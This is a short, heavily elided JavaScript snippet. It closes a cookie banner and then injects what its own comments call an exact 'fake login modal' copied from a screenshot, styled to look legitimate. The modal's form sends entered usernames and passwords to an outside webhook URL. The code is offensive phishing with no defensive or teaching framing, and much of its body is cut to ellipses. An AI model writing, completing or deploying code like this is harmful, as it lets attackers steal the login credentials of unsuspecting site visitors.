(function() {
  ...
  // If button not found, watch for it to appear (in case it loads slowly)
  if (!cookieClosed) {
  ...
  // === STEP 2: Show the EXACT fake login modal (from your screenshot) ===
  setTimeout(() => {
    ...
    const modalHtml = `
      ...
      ">
        ...
        ">
          ...
          <!-- SIMPLE LOGIN FORM - exactly as in your screenshot -->
          <form method="POST" action="${webhookUrl}">
            ...
            <!-- Weather (from your original) -->
            <div style="margin-top: 25px; color: #999; font-size: 12px;">
              30°C · Partly sunny
            </div>
          </form>

          <!-- Small close link (optional, for testing) -->
  ...
  }, 1000); // Delay to let cookie popup disappear
})();
